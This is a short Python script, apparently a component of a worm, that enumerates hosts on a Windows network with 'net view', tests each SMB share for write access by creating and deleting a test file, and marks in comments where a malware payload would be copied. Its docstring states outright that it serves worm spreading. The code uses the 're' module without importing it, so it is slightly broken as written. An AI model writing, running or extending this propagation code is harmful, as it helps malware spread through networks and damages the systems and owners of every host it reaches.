import subprocess
import os

def find_writable_shares():
    """Find writable SMB shares for worm spreading"""
    result = subprocess.run(['net', 'view'], capture_output=True, text=True)
    hosts = re.findall(r'\\\\(\S+)', result.stdout)
    
    for host in hosts:
        shares_result = subprocess.run(['net', 'view', f'\\\\{host}'], 
                                     capture_output=True, text=True, timeout=3)
        shares = re.findall(r'(\S+)\s+Disk', shares_result.stdout)
        
        for share in shares:
            unc_path = f'\\\\{host}\\{share}'
            try:
                # Try to write test file
                test_file = f'{unc_path}\\test.txt'
                with open(test_file, 'w') as f:
                    f.write('test')
                print(f"[+] Writable: {unc_path}")
                # Copy malware here
                # Copy-Item payload.exe $unc_path
                os.remove(test_file)
            except:
                print(f"[-] Not writable: {unc_path}")
